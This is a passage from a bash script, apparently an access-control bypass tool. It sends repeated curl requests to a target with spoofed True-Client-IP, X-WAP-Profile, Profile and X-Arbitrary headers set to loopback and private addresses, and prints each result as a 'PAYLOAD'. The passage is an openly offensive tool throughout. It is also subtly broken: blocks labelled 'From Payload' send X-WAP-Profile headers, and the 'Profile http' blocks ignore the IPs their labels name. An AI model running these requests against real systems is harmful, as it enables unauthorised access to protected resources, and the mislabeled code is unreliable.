    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "True-Client-IP Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'True-Client-IP: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-WAP-Profile Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-WAP-Profile Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "From Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: localhost, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: localhost, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "From Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 192.168.1.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-WAP-Profile: 192.168.1.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Profile http: ${website_ip}// Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: 127.0.0.1// Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: *// Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: 8.8.8.8// Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: null// Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: 192.168.0.2// Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: 10.0.0.1// Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: 0.0.0.0// Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: localhost// Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Profile http: 192.168.1.1// Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Profile: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Arbitrary http: ${website_ip}// Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: 127.0.0.1// Payload: 127.0.0.1"
